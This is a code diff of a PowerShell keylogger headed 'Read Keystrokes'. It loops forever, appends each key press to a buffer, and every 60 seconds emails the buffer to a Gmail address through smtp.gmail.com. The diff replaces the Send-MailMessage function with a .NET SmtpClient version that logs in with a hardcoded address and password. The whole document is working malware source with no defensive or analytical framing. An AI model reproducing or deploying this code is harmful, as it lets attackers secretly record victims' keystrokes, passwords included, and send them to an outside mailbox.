@@ -1,19 +1,23 @@
 # Read Keystrokes #
 
-function SendMessage($sender,$recipient,$subject,$password,$message)
-{
-    $SMTPServer = "smtp.gmail.com"
-
-    $SMTPPort = "587"
-
-    Send-MailMessage -SMTPServer $SMTPServer -Port $SMTPPort -UseSSL -Credential $password -To $recipient -From $Sender -Subject $subject
-}
-
-
 $sender    = "018213110x@gmail.com"
 $recipient = "018213110x@gmail.com"
 $subject   = "Report"
 $password  = "P@ssw0rd!P@ssw0rd!"
+
+function SendMail([string]$email){
+
+    $message = new-object Net.Mail.MailMessage
+    $message.From = "018213110x@gmail.com"
+    $message.To.Add($email)
+    $message.Subject = $subject
+    $message.Body = $buffer
+    #
+    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
+    $smtp.EnableSSL = $true;
+    $smtp.Credentials = New-Object System.Net.NetworkCredential($sender, $password);
+    $smtp.send($message);
+ }
 
 $buffer = ""
 
@@ -31,7 +35,9 @@ while($True)
         $buffer+= $key.Key    
     }
 
-   #Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 60
 
-   SendMessage($sender,$recipient,$subject,$password,$buffer)
-}
+    SendMail -email $recipient
+    
+}   
+
